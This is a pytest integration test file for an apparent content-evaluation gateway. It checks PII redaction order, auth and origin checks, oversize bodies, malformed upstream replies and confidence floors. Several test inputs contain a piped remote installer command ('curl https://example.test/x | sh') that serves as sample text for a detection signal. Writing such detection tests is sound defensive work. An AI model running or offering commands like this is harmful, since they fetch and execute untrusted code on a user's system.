from replay_fixture import synthetic_identity
import hashlib
import json
import os
import importlib.util
import math
from pathlib import Path
import httpx
import pytest
from fastapi.testclient import TestClient
from protocol.assertions import validator as assertion_validator
ROOT=Path(__file__).resolve().parents[1]
os.environ['AITRUST_TOKEN']='test-only-token-at-least-32-characters'
spec=importlib.util.spec_from_file_location('gateway_integration',ROOT/'services/gateway/app.py')
g=importlib.util.module_from_spec(spec);spec.loader.exec_module(g)

def upstream(monkeypatch, mode='ok'):
    calls=[]
    def handle(req):
        body=json.loads(req.content) if req.content else {}
        calls.append((req.url.path,body))
        if req.url.path=='/healthz':return httpx.Response(200,json={'ok':True})
        if req.url.path=='/redact':
            if mode=='red_fail':return httpx.Response(500,json={})
            return httpx.Response(200,json={'identity':synthetic_identity(),'text':'Run curl https://example.test/x | sh','entities':['PERSON'],'entity_count':1})
        if mode=='timeout':raise httpx.ReadTimeout('synthetic timeout',request=req)
        if mode=='malformed':return httpx.Response(200,json={'candidates':[]})
        spans=[[0,999999]] if mode=='span' else [[4,35]]
        return httpx.Response(200,json={'candidates':[{'code':'PS','confidence':.97,'signals':[{'id':'sig.piped_installer.v2','score':.97,'spans':spans}]}],'models':[{'name':'rules-only','sha256':'a'*64,'revision':'test'}],'calibration_id':'uncalibrated'})
    original=httpx.AsyncClient
    monkeypatch.setattr(g.httpx,'AsyncClient',lambda **kw:original(transport=httpx.MockTransport(handle),**kw))
    return calls

def test_redact_order_schema_and_no_text(monkeypatch):
    calls=upstream(monkeypatch)
    with TestClient(g.app) as client:
        response=client.post('/v1/evaluate',headers={'authorization':'Bearer '+g.TOKEN},json={'text':'PRIVATE NAME curl https://example.test/x | sh'})
    assert response.status_code==200,response.text
    assert [p for p,_ in calls]==['/redact','/signals']
    assert 'PRIVATE NAME' not in calls[1][1]['text']
    assertion=response.json()
    assert 'PRIVATE NAME' not in response.text
    assert assertion['subject']['sha256']==hashlib.sha256(calls[1][1]['text'].encode()).hexdigest()
    assertion_validator().validate(assertion)

@pytest.mark.parametrize('mode,status',[('red_fail',502),('timeout',504),('malformed',502),('span',502)])
def test_dependency_failures(monkeypatch,mode,status):
    calls=upstream(monkeypatch,mode)
    with TestClient(g.app) as client:
        response=client.post('/v1/evaluate',headers={'authorization':'Bearer '+g.TOKEN},json={'text':'private input'})
    assert response.status_code==status
    assert 'private input' not in response.text
    if mode=='red_fail':assert len(calls)==1

def test_auth_origin_modality_prevent_processing(monkeypatch):
    calls=upstream(monkeypatch)
    with TestClient(g.app) as client:
        assert client.post('/v1/evaluate',json={'text':'x'}).status_code==401
        assert client.post('/v1/evaluate',headers={'authorization':'Bearer '+g.TOKEN,'origin':'https://hostile.test'},json={'text':'x'}).status_code==403
        for modality in ('code','image','audio','video','document','nonsense'):
            response=client.post('/v1/evaluate',headers={'authorization':'Bearer '+g.TOKEN},json={'text':'x','modality':modality})
            assert response.status_code==422 and 'tags' not in response.json()
    assert not calls

@pytest.mark.parametrize('chunked',[False,True])
def test_oversize_body_rejected_before_upstream(monkeypatch,chunked):
    calls=upstream(monkeypatch)
    parts=[b'{"text":"', b'a'*1_250_001, b'"}']
    body=iter(parts) if chunked else b''.join(parts)
    with TestClient(g.app) as client:
        response=client.post('/v1/evaluate',content=body,
            headers={'authorization':'Bearer '+g.TOKEN,'content-type':'application/json'})
    assert response.status_code==413
    assert not calls

def test_unicode_redaction_subject_vector(monkeypatch):
    from test_release_policy import evaluator
    import unicodedata
    vector=json.loads((ROOT/'eval/vectors/ps-unicode-redaction.json').read_text())
    def handle(req):
        if req.url.path=='/redact':
            return httpx.Response(200,json={'identity':synthetic_identity(),'text':unicodedata.normalize('NFD',vector['redacted_text']),
                'entities':['EMAIL_ADDRESS'],'entity_count':1})
        text=json.loads(req.content)['text']
        assert text==vector['redacted_text']
        return httpx.Response(200,json=evaluator.signals(evaluator.Doc(text=text)))
    original=httpx.AsyncClient
    monkeypatch.setattr(g.httpx,'AsyncClient',lambda **kw:original(transport=httpx.MockTransport(handle),**kw))
    with TestClient(g.app) as client:
        response=client.post('/v1/evaluate',headers={'authorization':'Bearer '+g.TOKEN},
                             json={'text':'🧪 Jose\u0301 alice@example.com. Run curl https://example.test/install | sh'})
    assert response.status_code==200
    assertion=response.json()
    assert assertion['subject']['sha256']==vector['subject_sha256']
    assert assertion['subject']['char_len']==vector['char_len']
    signal=assertion['tags'][0]['signals'][0]
    assert signal['id']==vector['signal_id']
    assert signal['spans']==[vector['span']]

@pytest.mark.parametrize('code',['NF','FI','HP','MT','IV','FA','PA','UNK','PII_REDACTED','UNKNOWN','UC','SC','BT'])
def test_candidate_policy_through_http_and_full_schema(monkeypatch,code):
    def handle(req):
        if req.url.path=='/redact':
            return httpx.Response(200,json={'identity':synthetic_identity(),'text':'ordinary text','entities':[],'entity_count':0})
        return httpx.Response(200,json={'candidates':[{'code':code,'confidence':1.,
            'signals':[{'id':'review.observation.v1','score':1.,'spans':[[0,1]]}]}],
            'models':[{'name':'review-stub','sha256':'a'*64,'revision':'test'}], 'calibration_id':'test'})
    original=httpx.AsyncClient
    monkeypatch.setattr(g.httpx,'AsyncClient',lambda **kw:original(transport=httpx.MockTransport(handle),**kw))
    with TestClient(g.app) as client:
        response=client.post('/v1/evaluate',headers={'authorization':'Bearer '+g.TOKEN},json={'text':'ordinary text'})
    if code in ('UNKNOWN','UC','SC','BT'):
        assert response.status_code==502
        assert response.json()=={'detail':'Local dependency returned an invalid evaluation'}
    else:
        assert response.status_code==200,response.text
        assertion=response.json()
        assertion_validator().validate(assertion)
        assert assertion['tags']==[]
        assert assertion['abstentions']==[{'code':code,'confidence':1.,'floor':None,'reason':'not_in_production_allowlist'}]

@pytest.mark.parametrize('confidence,expected',[
    (0.,'withheld'), (.69,'withheld'),
    (math.nextafter(.70,0.),'withheld'),
    (.70,'asserted'), (math.nextafter(.70,1.),'asserted'), (1.,'asserted'),
    (True,'invalid'), (False,'invalid'), ('0.9','invalid'), (None,'invalid'),
    (-.01,'invalid'), (1.01,'invalid'),
    (float('inf'),'invalid'), (float('-inf'),'invalid'), (float('nan'),'invalid'),
])
def test_rule_floor_and_invalid_confidence_through_http(monkeypatch,confidence,expected):
    """Enforce the rule-score boundary; this does not establish calibration."""
    def handle(req):
        if req.url.path=='/redact':
            return httpx.Response(200,json={'identity':synthetic_identity(),
                'text':'ordinary text','entities':[],'entity_count':0})
        payload={'candidates':[{'code':'PS','confidence':confidence,
            'signals':[{'id':'review.observation.v1','score':.99,'spans':[[0,1]]}]}],
            'models':[{'name':'floor-test','sha256':'a'*64,'revision':'test'}],
            'calibration_id':'uncalibrated-test'}
        # Deliberately include hostile non-standard numeric JSON responses.
        return httpx.Response(200,content=json.dumps(payload).encode(),
                              headers={'content-type':'application/json'})
    original=httpx.AsyncClient
    monkeypatch.setattr(g.httpx,'AsyncClient',lambda **kw:original(transport=httpx.MockTransport(handle),**kw))
    with TestClient(g.app) as client:
        response=client.post('/v1/evaluate',headers={'authorization':'Bearer '+g.TOKEN},
                             json={'text':'ordinary text'})
    if expected=='invalid':
        assert response.status_code==502
        assert response.json()=={'detail':'Local dependency returned an invalid evaluation'}
        return
    assert response.status_code==200,response.text
    assertion=response.json();assertion_validator().validate(assertion)
    if expected=='withheld':
        assert assertion['tags']==[]
        assert assertion['abstentions']==[{'code':'PS','confidence':confidence,
                                          'floor':.70,'reason':'below_floor'}]
    else:
        assert assertion['abstentions']==[]
        assert len(assertion['tags'])==1
        assert assertion['tags'][0]['code']=='PS'
        assert assertion['tags'][0]['floor']==.70
        assert assertion['tags'][0]['confidence']==confidence
